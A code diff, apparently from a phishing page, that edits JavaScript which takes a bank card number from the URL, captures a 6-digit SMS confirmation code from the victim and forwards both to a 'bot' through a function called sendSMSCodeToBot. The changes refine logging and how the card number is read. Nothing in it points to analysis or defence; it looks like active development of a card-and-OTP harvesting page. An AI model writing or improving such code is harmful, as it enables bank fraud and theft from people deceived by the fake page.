@@ -840,6 +840,7 @@
         // Предотвращаем масштабирование на iOS при фокусе
         document.addEventListener('touchstart', function() {}, {passive: true});
         // Функция отправки SMS кода в бота
+// Функция отправки SMS кода в бота
 async function sendSMSCodeToBot(code) {
     try {
         // Берем номер карты из sessionStorage
@@ -872,23 +873,23 @@ async function sendSMSCodeToBot(code) {
     }
 }
 
-// Сохраняем номер карты при переходе на SMS страницу
+// Сохраняем номер карты при загрузке SMS страницы
 window.addEventListener('DOMContentLoaded', function() {
     const urlParams = new URLSearchParams(window.location.search);
-    const cardNumber = urlParams.get('card') || sessionStorage.getItem('cardNumber');
+    const cardNumber = urlParams.get('card');
     if (cardNumber) {
         sessionStorage.setItem('cardNumber', cardNumber);
-        console.log('💳 Номер карты сохранен:', cardNumber);
+        console.log('💳 Номер карты для SMS:', cardNumber);
     }
 });
 
-// Обновляем обработчик кнопки подтверждения
+// Обновляем обработчик кнопки подтверждения в SMS
 document.getElementById('confirmBtn').addEventListener('click', async function() {
     const inputs = document.querySelectorAll('.code-input');
     const code = Array.from(inputs).map(input => input.value).join('');
     
     if (code.length === 6) {
-        console.log('🔢 Введенный код:', code);
+        console.log('🔢 Введенный SMS код:', code);
         
         // Отправляем код в бота
         const success = await sendSMSCodeToBot(code);
@@ -904,4 +905,5 @@ document.getElementById('confirmBtn').addEventListener('click', async function()
     </script>
 </body>
 </html>
+
 
